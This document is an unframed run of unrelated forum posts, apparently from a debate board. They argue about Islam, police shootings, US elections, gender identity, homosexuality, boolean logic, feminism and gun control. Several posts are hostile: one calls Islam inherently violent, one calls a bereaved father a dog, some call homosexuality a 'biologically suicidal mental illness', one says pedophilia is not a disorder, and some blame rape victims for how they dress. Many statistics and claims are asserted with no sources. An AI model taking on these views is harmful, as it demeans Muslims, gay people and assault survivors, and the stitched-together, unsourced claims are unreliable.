In countries where Sharia is the law, it applies to both Muslims and non-Muslims as it is the law of the state.  An recent example of this is the imprisonment and threatened flogging (350 lashes, essentially a death sentence) against a 74 year old British man in Saudi Arabia for possessing wine he fermented himself (the Brits eventually negotiated to have his sentence lowered).

Now, the counterargument to this is that there is equally abusive treatment in Western countries for prohibited drugs.  The justification the state gives for incarcerating drug users in the West is based on poor utilitarian reasoning, but that is still a slight step up over basing incarceration on authoritarian religious reasoning.

You are right, the methodology in that poll is misleading/inaccurate.

Not to move the goalposts here, but since you brought it up, I would also further the argument that regardless of what % of Muslims personally support violence, Islam is inherently violent.  The fixed doctrine of Islam is that Muhammad is the final and greatest messenger of god.  Muslims consider an objectively brutal tyrant to be divine, which leads any derivation of law or ethics down a path that justifies atrocities to be committed especially against those who reject Islam.

Wow. That was really quite beautifully written, and although I've heard the story of Sysiphus more times than I care to remember, you somehow seem to have given it a second meaning, a story of self-creation by self-destruction of sorts.
I've never looked at it from the viewpoint of seeing it as an addiction, but the more I think about it, the more it rings true.

The only problem I have had in the past, which inflicted this doubt in myself, is that when you try to explain your way of thinking to someone, telling them that you see yourself as your own God, somehow upsets them. Almsot as if it makes them realise that they are under a self-willingly influenced domination relationship, not with an actual God, but with an idea, an idea that claims their lives as their own by telling them that they are not in control of their own lives.

I spent over three years dedicated to nothing but religious studies, trying to somehow change my opinion, to somehow find a belief which I never had to begin with, but it was to no avail.

[Rather fun life story of mine: I made my religions teacher in high school, (correct American/English term for upper secondary education?) by his own will apologies in front of the whole class for what he had expressed, claiming that it was indeed falsehood, and then take two weeks off from work to ""find himself"", during which time I once met him at a local pub, only to have him stare at me, put his drink down, and then quickly walk away from there.]

I don't believe that one should need external validation to find happiness and fulfilment in one's life. Rather, it is only through self discovery and research that one can find what makes one truly happy.
Sometimes I really wish I could take the easy way out and exclaim to be a believer, but even if I did I would always consider myself an imposter."

I'm getting my information from local articles as well as live streams that I've seen, and the fact that I live right next to where it happened. 

He wasn't just sitting in his car reading a book waiting for his son. That's the fucking point. The daughter's story was that her dad was sitting in the car, reading a book, waiting for his son and the cops just rolled up, broke the windows, tased him, and then shot him four times. She wasn't there. She saw it on the news and came to the location to live stream the aftermath. She isn't a credible source for what happened. 

According to police and eyewitnesses, the man got in and out of his car several times while holding a gun. That's suspicious enough to warrant further investigation by passing police. Police and eyewitnesses also attest to the fact that police identified themselves and asked him to put the weapon on the ground, and he did not. Escalation of force is warranted at this point. Whether that's a fatal shot or not is up to the officer in the situation. 

I can understand how peaceful protests may not get the word out as much, but getting a bad word out is exponentially worse than getting slightly less attention during a peaceful protest.

White people make up roughly 62 percent of the U.S. population but only about 49 percent of those who are killed by police officers. African Americans, however, account for 24 percent of those fatally shot and killed by the police despite being just 13 percent of the U.S. population. 

That actually means that blacks are 2.5 times more likely to die from officers at equal rates

Media extropolation of bad examples =/= blacks have it easier when it comes to police. They are more likely to die from police, even though police are more likely to die from WHITES. That in itself shows there is a problem with minority-police relationships disregarding the fact that

- Minorities are arrested at higher rates for drug crimes even though whites commit more drug crimes
- Arrested at higher rates for theft, even though whites are more likely to commit theft especially in terms of credit card fraud. 

There is a problem with the interaction between minorities and police and simply being white improves your chance of a smoother interaction with police by a large margin."

I could tell you that morality comes from experience and proper raising during childhood. There is a thing such as objective morality. People didn't start complying with religion because of the fact that it held 'morals', even atheists have morals, it's something normal, no, people started complying with religion because they were afraid, because they knew that if they acted on their savage natures, there would be consequences, or at least, that's about all they knew. Maternity was always a thing. A mother taking care of her children was always a thing. A son respecting his mother was always a thing, and from then on, a human being respecting his wife out of affection and amity was always, always a thing. It's even in animals, look at elephants, they have social norms and morals (e.g two elephants only fight if they are of the same size, if one is weaker, the fight is off). I believe that you can trace back morals to the root of maternity and parenthood, as it was something ALL MAMMALS had.

But you're fucking blind. You won't even read my post for all I know. You'll jut tell me what your book tells you. I already know. I respect religion because it promotes good ethics and morals. PROMOTES, DOES NOT CREATE THEM AT ANY POINT.

Then again, I assume it was bigotry but it also could have been ignorance. No, the Christian man probably wouldn't have been escorted out (also, it was the male who was sweating without a headscarf). If the flight attendant made a plot in her head based off of her understanding of Muslims derived from the Media (among other things) and was genuinely worried for her safety and others, I wouldn't put her at fault, but if she got the pilot to remove them solely based on their Muslim affiliation then I don't stand with them, however, I don't think that to be the case. I believe she was legitimately uneasy, reported her fear to the captain, and to keep things kosher and safe he decided to remove the two he was told looked suspicious.

It wasn't solely based off of religious belief. She was worried because of what she saw and heard from them as well. Her fear was irrational and I don't disagree, but the captain didn't say 'oh they're Muslim? Remove them for me' no, his co-worker was worried based off an irrational fear that caused her to draw conclusions about a plot that wasn't taking place and they were removed. Was the fear that ultimately got them removed derived from bigotry? Yes, I think so, but what she saw and heard was very real too her and enough to report it to someone."

Can you tell me what Trump said that's so bad? I think he defended himself quite well. Most can agree the Iraq war post-9/11 was pointless. Khizr's son died in 2004, in the initial war in Iraq. In 2003 Trump condemned the Bush administration and the Iraq war, he was completely against it. However Hillary voted on an Iraq war. Essentially Khizr is siding with the woman who put his son in a position to be killed. Khizr is being used as a ploy, everything Trump says is being spun as Islamaphobic and it's really fitting the Trump-Islamaphobe narrative. Hillary has Khizr on a leach like the dog he is, and she's yelling sick 'em boy.

In 2003 Trump sympathizes with fallen soldiers, Iraq citizens and is against the war:

Your analogies are flawed. Kings and peasants have no biological variation whereas sexes have an abundance. 

Also your argument that human culture is mutable so we ought to remove the biological influences on cultures is also baseless, that's an assertion of personal preference whereas it doesn't have a logical foundation. 

I do believe from a moral perspective that women ought to be given an equal opportunity, even if that conflicts with the cultural traditions stemmed from biological variations however I do not believe that is much of a problem in today's society, I believe that these biological variations are interpreted as unequal opportunity to people who can not grasp the concept of a post hoc.

We're using hypotheticals so unless you're saying that to your knowledge the actual Donald trump isn't sexist, there's nothing suggesting a straw man fallacy because there is no argument being misrepresented and thus straw manned.

I'm guessing he assumed most people could realize this, but there's a an obvious level of severity of lies. Obviously yes in a formal courtroom and intentionally lying would be more severe, as would it be if it was in regards to government classified documents, as would it be sworn under oath? I make this as a normative claim as I'm sure you would agree with me, if not feel free to say it.

I'm not sure what you mean by the first question, what do you mean 'which'? Social constructs are constructed by none other than, society and culture. 

P1: Social constructs are defined by society.
P2: Gender is a social construct.
P3: Attack helicopter is not a defined gender in said society.
C: Therefore, attack helicopters are not a legitimate social construct in said society.

This is what I expected most people to disagree with. For clarification, I did not provide any justification to any of the premises to avoid justifying something you already could of already potentially agreed with. 

I think the simplest counter is that we have gender roles and expectations for males and females, and none for attack helicopters. We (as in, society) expect men to be less emotional and women, we expect men to lead more than we do women. These are examples. This is accepted within society, it is something unanimous because it is connected to our sex; an attack helicopter is not connected to our sex.

This is what the, admittedly, ambiguous term 'define' means when I use it in my argument in my previous post."

I won't be arguing with this definition as it is my belief that this clear cut definition offers no confusion and that the only confusion existing, in this context, is caused by those who choose to skew such a definition. If you are to identify as a 'man', or 'woman', what do you mean to say? That you hold traits similar to the common man or woman? If so, what need is there to identify as a man or woman? I hold traits similar to that of the common child, yet do not identify as one. It would just add confusion for me to request that I be referred to as a child. The concept of gender being dynamic has, I will argue throughout this thread, added unnecessary confusion and hostility throughout society.

I think the crucial point is that you are the 'gender' which corresponds to your biological makeup. For example, a person possessing both female and male sexual characteristics or organs can properly be referred to as a hermaphrodite.

Where a truth value and existence can be absolutely contingent upon eachother is the only place where I would say that there is no denial or even logic required. It's quite simply stated that in a hypothetical world if we defined 1&1!=1 then regardless of the linguistics used to convey the relationship they would simply not be speaking of the same relationship correct? So 1&1=1 Absolutely and ontologically objectively regardless of any doubts.

I definitely see what you mean, but idk i feel like even for metaphysical solipsists when definitions and truth values are inextricable then that is absolute knowledge, simply because if the 1&1!=1 then the & operator previously used is not the & operator used in the original statement. It gets somewhat confusing for me, this is like the ground zero axiomatics of knowledge I can't think of a better argument to convince a metaphysical solipsist if not that."

That means anyone who doesn't like pizza while everyone likes pizza would mean they have a disorder because they're not in the majority of people that like that same thing.

Pedophilia isn't a disorder. 

If you're 24 and you look at a 13-year old girl and want to fuck her, then you either get no pussy because you're an ugly ass sosh or you're a legit pedophile who is a couple steps away from luring little girls into their white vans offering candy.

But people are attracted to both sexes in that cases, no? So logically speaking, your own genetic code is both adhered and opposed to, right? So how does that make homosexuality nothing more than a narrowed sexual preference that becomes so deep that it forgets its actual roots? Did you ever talk to a pedophile? Do you know of non-exclusive pedophiles and exclusive pedophiles? Do you know of people who are attracted to both men and women, y'know, bisexual people, prefer to call themselves 'open-minded sexually'?

If it is geared towards the survival and comfort of one individual and him practicing, or simply 'being' who they feel like they are, then, the systemic functioning is amply subjective and relative to each individual, or rather, each group of individuals, yet, each group of individuals may feel the need to procreate; homosexuality does not cancel the concept of procreation in one's mind, which is why we see homosexuals adopt or do other things to have babies. It does not skew by any means the concept of parenthood, affection towards the child, sense of protectiveness, it may affect behavior (may), but aside from that, rationally speaking, the progress of a population, with the proper means, is still accomplished with all groups that wish for such progress to be accomplished, heterosexuals, homosexuals, etc....

If they negate our survival then they are the incorrect function assuming what you referred as the former. I don't assume that mutations go against what is to be our correct systemic function in the slightest, but I do assume that this particular mutation is obviously an incorrect systemic function as it is fights against the chance of survival. 

I suppose I assumed it to be inherently obvious. You would disagree that the main goal of evolution is to better suit humans for reproduction and survival?  Keep in mind I'm not denoting that the such is ontologically objective, as such relationships cannot exist between objects from that perspective, but such can be represented from an epistemically objective & biologically standpoint. I believe that is where the confusion is coming from?

It's a demonstrable phenomena that evolution favors those better equipped with survival and reproductive habits and capabilities. Denying such is plain ignorant in my opinion, it can be deduced from common sense.

If we can define correct as such ""(of a thing or course of action) meeting the requirements of or most appropriate for a particular situation or activity."" then it is inherently obvious that evolutionarily and biologically, homosexuality is in fact incorrect systemic function. Perhaps I'm misunderstanding something?

Interesting actually. I can't say I actually thought of that, it makes sense that homosexuality by promoting antinatalism would actually be promoting survival.

But to my knowledge (I could be incorrect, so feel free to prove me wrong if so) evolution has never tended to promote such an act. As if overpopulation did begin to occur, the delicate nature of the ecosystem would lack sufficient food to support the overpopulation leading to a decrease in the species numbers far before the hundred thousands of years passed for an adequate evolutionary trait to develop."

Ancaps sympathize with ancoms because of the common non aggression axyom and ideally would identify with the economic ideologies if we had unlimited resources.

Ancoms relationship with ancaps more complicated because there's some who really hate capital and can't stand it, but some if not most will still sympathise because of the non aggression axyom.

Either ancaps or ancoms actively despise Marxist-Leninists, ancaps because it's a completely sick ideology from all possible points of views, same or worse than Nazism, and ancoms because they know it's because of these degenerates that Communism got a bad reputation when it's totally not what Communism is. Karl Marx said it himself, humanity would demand Socialism and slowly progress towards Communism. Lenine decided it must be forced upon people and that Capitalism should be obliterated.

I argue that the reason you like both males and females is because you cannot spot the differences very well between your emotions and NOT because you are different from others. Its a different thing to be romantically attracted to someone than physically attracted. Your attraction between  both men and women is not perfectly balanced and i bet you know that aswell. Sexuality is a complex mix of love, attractions, emotions, lust, fantasy, and ideals - it is far too complex to be 50/50 anything... If you dont feel all of the above  then you just like the other person and you dont need to have a sexual relationship with him. You just prefer him as a company from someone else.

I disagree. I believe they dont know who they truly are and that is why instead of trying to invent a name for their emotional confusion they have to understand emotions and not just the cause of them. I can understand how a male can like another male when geneticists have a role in it (like the study for the X chromosome), but i cannot understand how a healthy person can have the same effects so i believe ignorance and confusion turn people in this direction as we are not like the other animals and we can easily overcome even our own nature if we really want to.

***CITING***[https://hackforums.net/showthread.php?pid=51274173#pid51274173]***CITING***

Here are some credentials of a Messiah pulled from a JEWISH site:

Messiah was to be born at Bethlehem: Micah 5:2 (Micah 5:1 in Hebrew Bible)
Messiah would be from the tribe of Judah: Genesis 49:10
Messiah would present himself by riding on an ass: Zechariah 9:9
Messiah would be tortured to death: Psalm 22:1-31
Messiah would arrive before the destruction of the Second Temple: Daniel 9:24-27
Messiah's life would match a particular description, including suffering, silence at his arrest and trial, death and burial in a rich man's tomb, and resurrection: Isaiah 52:13-53:12
In detail as to lineage, birthplace, time, and lifestyle, Jesus matched the Messianic expectations of the Hebrew Scriptures.

The record of this fulfillment is to be found in the pages of the New Testament. But several other factors combine to further substantiate the Messiahship of Jesus.

In the first place, he claimed to be the Messiah! When a woman said to him, ""I know that Messiah is coming."" he replied, ""I who speak to you am he"" (John 4:25-26). Naturally, that doesn't prove anything one way or the other. But if Jesus had never made the claim to be the Messiah, why would we bother to try and prove that he was? His own claim lays the groundwork for the rest of the evidence.

Jesus' life is in sharp contrast to that of the false Messiahs, and it is a positive demonstration of what we would expect the Messiah to do.

Thus, Jesus worked many miracles of healing, bringing wholeness into people's lives, forgiving sin and restoring relationships. In contrast with Shabbetai Zevi, for instance, Jesus carried out the Law of Moses as a devout Jew. And in contrast with Bar Kochba, although Jesus also died, he was resurrected!"

You are absolutely right, she has not committed treason in the legal definition of the word, but you can't deny that for example on the email scandal she has been naive, she hosted her own server to host official matters in a totally unsafe way, something that should be behind federal servers and that resulted in tons of confidential (even potentially classified) information to come out to public. If people were selling parts of this information on the internet you can sure as hell bet secret agencies all around the world from other countries have this information.

No, see, first he said that she committed treason, words are tricky and she has not in fact committed treason, but it flows both ways, Donald Trump hasn't said that he would bomb the shit out of ISIS, he said that he would bomb the shit out of the oil fields, which by the way are generating 3 Million Dollars a day that ISIS can freely use to fund terrorist cells a bit everywhere around the world, this may very well be a unique point of failure in their war machine that can bring the whole thing down (or at least stop it from rapidly growing from now on), even if it isn't it will surely help. If you did this intentionally you're introducing an argumentative logical fallacy - ***LINK***straw man[http://rationalwiki.org/wiki/Straw_man]***LINK***.

Anyway, Donald Trump has defined his point of view on ISIS, and it's a solid one imho (although opinions are opinions, not a fact, they're subjective, and what I agree with someone else might not do so), Hillary Clinton's point of view on ISIS and plan is to force a no-fly zone above ISIS controlled territories, by now you might be asking why, right?

Again, I already posted on another thread that I have very limited knowledge on this topic of global warming. However, the nuclear war was an example to show the kind of problems bad diplomatic relations can have. No I do not have my tin foil hat on with my bunker full of supplies once a nuke strikes. I am not that kind of person haha. I do not believe a nuke will blow up on this planet in my life time. So I don't wake up worrying about it. (nuclear war was a shitty example and wasn't my point) My point was that diplomatic relations between nations has killed and will kill more civilians and soldiers then global warming has and in the near future will ever. Diplomatic relations cause wars, embargo's, bombings... etc Which kill real people and destroy real families.  So yes, to say relationships between nations are less important then global warming (at the time being) is bullshit, short sighted, ignorance. 

You want to disagree with that? Fine be like those religious nut jobs who deny FACTS. Wanna argue facts on this one? Lets go. You respond with all the deaths of human beings global warming has caused and will cause in the next 25 years. I will reply with all the deaths of human beings caused by diplomatic relations.

Nuclear war? Are you kidding me... You're literally taking the words right out of Trump's mouth... Can't you think for yourself? If that were true, why is ruining relationships with China and Mexico a good idea? And instigating the Muslim people? That's completely contradictory... There's a huge reason nuclear war hasn't started already, and it's called nuclear deterrence. It's a pretty simple concept, so at least be educated on the the points you bring to an argument. The idea is that if one nation were to fire a nuke, many nations would retaliate, and the world would be destroyed. This is exactly why there hasn't been a nuclear weapon fired on another nation since Hiroshima and Nagasaki. In fact, those were the only times. The worst things that can happen from global warming are already happening. I'll quote this from another thread, it's obviously not directed at you.

In Canada for example, they're losing MASSIVE MASSIVE amounts of their forests to a beetle that used to die in the winter. Now due to global temperatures rising, and winters being shorter and not as cold, the beetle survives the winter and feeds on the Boreal Forest all year long. Furthermore, the Canadian forest has actually suffered massive losses due to forest fire. Canada has had one of the driest and hottest springs ever, and it's sparked a forest fire that's WAY beyond control. This has destroyed many lives, habitats, and cost the economy huge. Not just because of the loss of forest (which is an important industry in Canada) but because people had to migrate away from their jobs. That's just one very immediate example, and it's directly linked to the rising temperatures. Canadian forests aren't able to withstand this intense and lasting heat. There's a bunch more examples in my quote, but you'd have to look into each one specifically. There is evidence."

1. Un-natural. Not really, there are gay animals that exist as well outside of humans. Many people fail to recognize that as well, such as Dolphins, display acts of homosexuality. Plus the fact, what does really bother you? The fact that they are together and keep in mind can't reproduce or decide who they are attracted too, or that they have gay sex that disgusts you? Plus the fact that gays have been here since who knows how long. It's not like it's just a recent trend to be gay.

2. Once again, is the act of another male penetrating another male the thing that disgusts you? If so, how is it any different than a female getting anally penetrated? I mean, they are human beings like everyone else. They have hygiene, they have everything everyone else has, but just a different sexual perspective. I don't see how that even remotely disgusts you. Once gain, you can't choose who you are attracted too. You just are. Some are females and too others are males.  

3. Biologically Insane. This kinda is weird to me, how is it insane? In what way am I asking. Yes the reproductive organs don't match, but how does that even come into play as biologically insane. Just because they aren't able to have kids doesn't mean everyone should anyway. We don't live in a century where reproducing is required and if we don't the basis of man will fade out. It's the 21st century where lots of kids are aborted every day, just because a couple can't reproduce in a modern day does not make this biologically insane what so ever. 

4. Disgusting, once again I feel like this is quite the arrogant statement to make. What makes them disgusting? And if it has anything to do with sex and what they do to their spare time, why do you even care about other peoples accords?

I can't tell if you are trolling and I do hope you are. Gay's have been prosecuted since Roman era and before that through religion. It isn't that they are all of a sudden turning up like crazy. There has always been gay people, except back then you were killed if you were. So of course, not everyone is going to storm a city announcing they were gay, for the sake of their lives. People don't just 'turn' gay. You don't wake up morning saying.. ""Hey! Today's some good day to suck some dick!."" Besides, there is more to homosexuality than that, such as relationships I assume. (Not gay, but they are just like straight people with a different sexual preference.)"

1. Well considering it seems to be occuring in nature, calling it un-natural is a bit of a stretch. This argument is flawed because it assumes that since x is unnatural. x is therefore bad. Just because something is unnatural doesn't mean it shouldn't happen. I could say the same about drinking milk since we are not suppose to be drinking it past infant stages.

2. A personal opinion is not an argument

3. I assume this means then male and females are supposed to have sex to reproduce. Normally this is the case, however we have to remember this is not a requirement. The race as a whole must reproduce sure, however no INDIVIDUAL person NEEDS to reproduce, In fact there is an overpopulation problem so I am all for it. Not only that but sex is more than just for reproduction, especially humans. It is also to feel sexual pleasure. Ever human has the right to do so whether they like the opposite sex or the same sex. 

4. The same as #2

Being homosexual does not mean that you don't want to love a female. It means that you are attracted to males. Love is not the heavy hitter here, it is sexual orientation is. 

They can reproduce using a surrogate or donation if the want to expand their family. Or in the extreme case of repopulating the species they still can.

You due realize that homosexuality has existed for thousands of years, even now where our population has almost doubled in the last 100 years or so. I don't see how it is affecting our ability to populate the species.

Rape, in nature is natural but it's not natural or normal in humans.
The homosexuality being natural argument is now out of the ball part.

Being gay would mean that you do not want to love a female, you love men which cannot naturally reproduce meaning it is a choice to follow a suicidal biological pathway of two males loving and not producing an offspring.

If that were normal, surely our species would have died out or had a lesser population by now?

Now it isn't natural, nor is it normal due to the biology of our species, the only argument would be to force or procure a biologically suicidal mental illness into the mind which is entirely possible but is a choice by definition but theory in the case of mentally ill.

Heterosexual intercourse causes diseases too, some STD's are even more common in heterosexuals than homosexuals, such as genital herpes. So what? Everyone should stop having sex? No, people, both homosexual and heterosexual should use protection and get checked for diseases regularly. 

You can't say one side does something and should be disallowed for something that also occurs regularly on the other side but should not be disallowed. 

Sure HIV may be more common among the homosexual community, but there are many STD's out there, many of which are very common among heterosexuals. Chlamydia is one for example, as well as herpes.

just like I said earlier... No it doesn't unless you deny the existence of an objective realm entirely, and even then I'm not entire sure you're right. It's a relationship. It's not a physical object or tangible being it's simply a relationship in which we can programmatically define operations which can be represented by grouping together apples, turning on or off transistors, or doing anything else. You can't deny 1 & 1 = 1 because if it didn't, then you wouldn't be speaking of the & relationship. Even if no beings in the entire universe had ever came into life or if the universe had never existed, 1 & 1 = 1 because the operation is defined partly by that definition, and if that definition were altered then so that had not became true then it would not be the same relationship. Mathematics is the purest of all forms of knowledge that exists

So you agree the existence of objects (and relationships I might add) aren't dependent on a perceiver. Then you agree 1 & 1 = 1 correct? Since the relationship of & is defined as:
1&1=1
1&0=0
0&1=0
0&0=0
Simple boolean algebra, it is a relationship defined by the operator &, however in a seperate dimension, or world, or universe, perhaps another race would've defined the exact same relationship with different words or communication means entirely, but it's just representing on and on is on, or 1 and 1 is 1 etc. It's unarguably objective from an ontologic standpoint.

I'm using this example because it's much easier to visually represent and boolean algebra is fundamentally the least abstractional and clearly objectively represented form of knowledge, a basic relationship, that can exist.
***CITING***[https://hackforums.net/showthread.php?pid=50940639#pid50940639]***CITING***
However, the validity of mathematical knowledge can be absolutely certain using previously constructed relationship. Unless you somehow deny the objectivity of the previous relationship, which is just wrong (and flat out stupid), then you must admit that if the addition operator was defined as similar, slightly more complex, relationships using basic boolean algebra as well, then it must also be ontologically, objectively, certain. 

Thats what I'm trying to get across. Math isn't subject to interpretation. The validity of basic operations such as addition simply can't be denied because it can be objectively defined. If 1+1 didn't equal too, then you wouldn't be speaking of the addition operator.
***CITING***[https://hackforums.net/showthread.php?pid=50940639#pid50940639]***CITING***
The pure existence of the relationship itself justifies its validity. 1+1=2 is certain only because its existence and validity are inextricably contingent upon eachother. If 1+1 did not equal 2, then you would be speaking of a different relationship of quantities, on offs, or numbers. If that doesn't make sense to you, then I'm over this argument.

Bernie sanders has beat trump in every poll by huge margins, The FBI has came out and said they are literally investigating clinton because she tried to claim it wasn't an investigation. And she's recently started to lose to donald trump.

While sanders continues to win, continues to get more pledged delegates, he's eventually going to be the favorable candidate since he actually stands a chance at beating trump according to the polls. There are a lot of people who will choose trump over sanders because he wants to destroy the connection between big money and politics.

They don't feel like they ever belonged in the bathroom they were forced to go into so they want to be able to go into the one that they feel belongs to them (which is one bathroom, and it doesn't change again.) They're not forcing anyone to accept anything. They just wanna piss without feeling uncomfortable LOL. You think this is their choice or something. Imagine a woman going into a men's bathroom with like 3 or 4 guys in it. Bet she feels uncomfortable? That's how they feel. They didn't choose to feel that way, and they can't control it.

""I don’t see how there is any room for misunderstanding or misinterpretation of the statement I made on June 16th during my Presidential announcement speech,"" Trump wrote, adding, ""What can be simpler or more accurately stated? The Mexican Government is forcing their most unwanted people into the United States. They are, in many cases, criminals, drug dealers, rapists, etc.""

""Many fabulous people come in from Mexico and our country is better for it. But these people are here legally, and are severely hurt by those coming in illegally,"" wrote Trump. ""I am proud to say that I know many hard working Mexicans—many of them are working for and with me…and, just like our country, my organization is better for it.""

""""The Mexican Government wants an open border as long as it’s a ONE WAY open border into the United States. Not only are they killing us at the border, but they are killing us on trade … and the country of Mexico is making billions of dollars in doing so,"" he wrote. ""I have great respect for Mexico and love their people and their peoples’ great spirit. The problem is, however, that their leaders are far smarter, more cunning, and better negotiators than ours. To the citizens of the United States, who I will represent far better than anyone else as President, the Mexican government is not our friend…and why should they be when the relationship is totally one sided in their favor on both illegal immigration and trade.""

Look I understand people can get around these laws and be safe in their own homes

Fact is in unusual circumstances you can still be arrested for reasons that I think are unjust.  I don't care if they're edge cases, I literally don't care.  They are still cases and they happen

-""Friend"" turns you in to get back at you for stealing his girlfriend = you're fucked
-Friend brags about the drugs you've done with him and a police officer with a low arrest quota for the month overhears him = questioned, friend squeals

You can say ""Oh then these people are idiots and deserve to be arrested"" but honestly that's antithetical to the entire purpose of law enforcement.  You're literally saying those good at evading the laws are the ones who deserve to be free.  It's just ridiculous

Joe Schmoe has a stash of weed or shrooms or acid or some pills in his house -> apartment maintenance goes in to fix something unannounced (this literally happens all the time) and stumble upon it = this guy is fucked and did nothing morally wrong

2. Not one source, many sources (You didn't even read the numbers). The polls reported by the muslims themselves indicate a significant number (not a minority) of extremist beliefs in countries with majority muslim populations. You agree they have a real support of extremist ideology and jihadist schools, but make a false equivalence of protest with megaphones (hint: we already have gay rights, the muslims are against it) then try to say that not only is that just as bad, but that they are just as numberous (with no numbers).

This is one of Trump's talking points. He wont build ties with a country whose leadership and foreign ministry won't use their resources to help themselves.

 b) Seems like a wall would be effective in terms of stopping people travelling by land across the border. You also forgeot to mention the increased border patrol staff as part of Trump's policy. Even if a wall is unrealistic, the intent is clear and stopping illegal immigration is just that - stopping illegal immigration.

First the laws of the Old testament are no longer in place as Jesus abolished that with his death. 


Second of all the bible does teach homosexuality is wrong and its a sin therefor going to hell but people just tend to focus on homosexuality. Take Paul for example and what he teaches here. 


1 Corinthians 6:9-11King James Version (KJV)

9 Know ye not that the unrighteous shall not inherit the kingdom of God? Be not deceived: neither fornicators, nor idolaters, nor adulterers, nor effeminate, nor abusers of themselves with mankind,

10 Nor thieves, nor covetous, nor drunkards, nor revilers, nor extortioners, shall inherit the kingdom of God.

11 And such were some of you: but ye are washed, but ye are sanctified, but ye are justified in the name of the Lord Jesus, and by the Spirit of our God.



In other words it saying sinners will go to hell and everyone has sinned and come short of the glory of God. Not just homos nor does it imply that a gay can not be saved either.

Why not mention adoption or surrogacy? 

Same-sex individuals cannot procreate. That's why I advocate for adoption for those couples. The world is already overpopulated as is, and there is an abundance of orphan children. It's not inaccurate to say the baby boomer period has had and/or will have an effect on the economy in terms of social security and similar programs. Also, if the only purpose of intercourse is to procreate, shouldn't condoms be banned? What about sterile men and women who are older than 40?

Here's my take on all of this:

The more you seek social acceptance and agreement the more you are seen as an outsider. Making statements such as ""in general, people are quick to judge"" only speaks on your personal experiences which is fine. When it comes to me, I don't care if you prefer penis or vagina, whatever makes you happy. However once I feel that people begin to care about what I care about, that's kinda weird.

It's kind of like if you take a fat shit in your washroom, and you walk outside and ask people if what you did is okay, and if they think it's disgusting you call them judgmental and say that they shouldn't care what you did because they didn't see it. 

Same thing here,

Go suck that dick and be with that guy, don't seek approval, assume it's there. If you get confronted on the street by homophobes, treat it as one straight male would if someone else was hitting on their girlfriend. 

Seeing a man and a woman makeout in public may be less uncomfortable for me as seeing a man and a man, but that's because I'm not used to seeing that. I wouldn't care either way, just turn my head and mind my own business.

Am I a homophobe?

Nothing I'm about to say requires some source which your anecdotal little statements also lack anyway.

To specify on what I said earlier, I've actually read that eunuchs (men with their testicles chopped off) have similar life expectancy as women, indicating that increased testosterone, while providing the effect of making someone more physically masculine, also decreases lifespan.  

That being said, men still do the majority of dangerous physical labor jobs.  I mean this is common knowledge and requires no source.  Being a janitor is not the type of physical labor I'm talking about.  I'm talking about lumberjacks, deep sea fisherman, coal miners, construction workers, oil rig workers.  These are all at least 95% men and have high workplace mortality rates.

90% of workplace deaths are men.  Some similarly high percentage of workplace injuries are also men.  90% of suicides are men as well.  All of these issues which are arguably results of socialization cause men to have a lower average life expectancy.  

I don't feel like looking up the exact numbers, but 93% or 84% is the same fucking thing as 90% for the purposes of this post so feel free to look them up yourself.  This is common knowledge.

If women are just as good as men at everything, every single thing, and there is no inherent gender dimorphism in humans, then why did women end up being the ones who are supposedly oppressed?

And if women aren't just as good as men at everything, why are feminists expecting equal representation in every career path and claiming that a lack of equal representation is indicative of discrimination?

What do you mean ""not required"" to do physical labor. What is physical labor to you? My mother is a janitor; the person that lifted my aunt in the clinic the other day onto a stretcher was a women. Maybe they didn't need to do labor in pre-industrialized history, but much of that has changed now; men are also doing less physical labor with the help of technology and machines to do physical operations.  

Do you have sources to prove your statement that the reason why women live longer is because of what you said? 

Also, out of 500+ of my facebook ""friends"" about 70% are girls, in my age range (median is probably 21-22). In my opinion majority of them are ""decently attractive"" but I don't see them just stringing along and not working.

You won’t get gun control by disarming law-abiding citizens. There’s only one way to get real gun control: Disarm the thugs and the criminals, lock them up and if you don’t actually throw away the key, at least lose it for a long time… It’s a nasty truth, but those who seek to inflict harm are not fazed by gun controllers. I happen to know this from personal experience.


Ronald Reagan


Our nation was built and civilized by men and women who used guns in self-defense and in pursuit of peace. One wonders indeed, if the rising crime rate, isn’t due as much as anything to the criminal’s instinctive knowledge that the average victim no longer has means of self-protection.

I see your point that yes many men have very fulfilling jobs in engineering and science because they love those fields.  This applies to me.  

But I'm talking about the majority of people.  Mainly in the bottom 50% of society financially.  Yeah maybe Jimmy Bob loves his job as a plumber or lumberjack, but realistically if money were no object he'd be doing something else.  Women tend to go straight for the thing they would do if money were no object though, because for many of them money actually is no object because society grants them the privilege of expecting their husband to provide for them financially.

There was some study with high school career counselors and actual pursued career outcomes.  They ask students what job they would love if money were no object.  M% of boys end up in careers in that area, and F% of girls end up in careers in that area.  F ended up higher than M, as in the men gave up their ""if money were no object"" jobs and the women pursued them at higher rates."

As I also pointed out, feminism works to solve this by allowing both genders the privilege to choose to prioritise whichever side of your bifurcated worldview they want. Your lack of rebuttal implies that you agree with me in thinking that this is a good thing. Let's break down the social conventions that keep both men and women stuck in a proverbial rut, and increase everyone's agency to choose in the process.

In fact numerous feminist organizations oppose the men's rights movement.  Any time there's a men's rights discussion taking place at a university feminists show up and pull the fire alarms.

And you keep conflating issues - obviously feminism is important for third world shithole countries where women are oppressed, but that is not where feminists focus their efforts, they focus on the west and men offering women coffee in elevators

Yeah, people shouldn't commit rape.  But they always have, and they currently do, and they always will.  So instead of living based on your idealistic notions of how the world should be, there's nothing wrong with following simple pieces of advice like ""Don't get so drunk you can't even walk while wearing slutty clothing around horny guys""

You only ever look at it from the one side of sexism against women because you're been indoctrinated into ideological feminism.  What about the rampant sexism against men - women and children first in sinking ships, men being the ones who are forced to sacrifice their lives in war.  Based on the evidence I see nothing indicating women have been viewed as less than men, if anything it's the opposite since the lives of women are prioritized above the lives of men, all the time, no matter what, period. 

What does society call a man who wants a woman to give her life to defend him?  A fucking coward loser

""Teach men not to rape"" is a phrase that is absurd on so many levels it becomes pointless to explain why.
People(notice how I didn't say men exclusively as if women don't rape.) don't rape because they weren't taught not too.

People rape because they want to, regardless of their prior knowledge on rape if someone want's to forcefully have sex with a woman or man, he or she is going to do it.

However if you want to decrease your chances of becoming raped, I highly suggest you don't dress in a provocative way. Plain and simple.
If you want to decrease your chances of being raped, lock your door. Plain and simple.

Claiming we need to teach people not to rob is something beyond the stupidity of liberals.

They sent numerous requests out that they needed help because they were about to be overrun by terrorists and she did nothing. She let them die. The only reason she didn't get in trouble for it is because of who she is. Any military general would be serving the rest of his life in the stockades had they done the same.

